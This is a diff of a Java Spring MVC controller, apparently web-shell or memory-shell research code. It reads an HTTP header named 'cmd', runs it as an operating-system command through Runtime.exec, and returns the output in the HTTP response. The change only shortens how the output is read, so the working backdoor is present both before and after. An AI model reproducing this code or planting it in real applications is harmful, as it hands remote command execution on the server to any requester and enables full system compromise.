@@ -19,16 +19,8 @@ public class SpringMVCTestController {
         javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();
 
         String cmd = httprequest.getHeader("cmd");
-        java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
-
-        StringBuilder sb = new StringBuilder();
-        String line;
-        while((line = br.readLine()) != null){
-            sb.append(line + "\n");
-        }
-
-        br.close();
-        httpresponse.getWriter().println(sb.toString());
+        String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
+        httpresponse.getWriter().println(res);
 
         return new User();
     }
